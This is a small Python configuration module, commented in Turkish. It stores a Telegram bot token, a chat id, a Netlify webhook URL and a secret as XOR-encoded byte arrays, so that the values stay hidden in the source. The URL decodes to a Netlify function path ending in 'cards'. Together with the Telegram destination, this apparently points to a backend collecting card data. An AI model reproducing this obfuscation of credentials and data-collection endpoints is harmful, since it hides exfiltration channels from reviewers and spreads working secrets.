"""
Gomulu yapilandirma — runtime'da XOR ile cozulur, kaynak kodda acik deger yok.
"""

_K = 0x5C


def _d(b: bytes) -> str:
    return "".join(chr(x ^ _K) for x in b)


# Telegram bot token
_TG_TOKEN = bytes([107,101,110,109,101,104,106,107,111,108,102,29,29,25,106,4,
                   23,63,38,25,55,25,106,6,59,110,46,49,100,31,11,10,113,111,
                   14,61,16,109,56,31,59,8,53,45,44,63])

# Telegram chat id
_TG_CHAT = bytes([113,109,108,108,111,107,106,110,111,101,106,104,106,100])

# Netlify webhook URL
_NL_URL = bytes([52,40,40,44,47,102,115,115,59,51,48,56,57,50,113,58,61,53,46,
                 37,113,56,104,63,58,104,105,114,50,57,40,48,53,58,37,114,61,
                 44,44,115,114,50,57,40,48,53,58,37,115,58,41,50,63,40,53,51,
                 50,47,115,63,61,46,56,47])

# Netlify secret key
_NL_SECRET = bytes([61,46,42,63,49,100,110,100,110,101,36,36,17,17])


def get_tg_token()   -> str: return _d(_TG_TOKEN)
def get_tg_chat()    -> str: return _d(_TG_CHAT)
def get_nl_url()     -> str: return _d(_NL_URL)
def get_nl_secret()  -> str: return _d(_NL_SECRET)
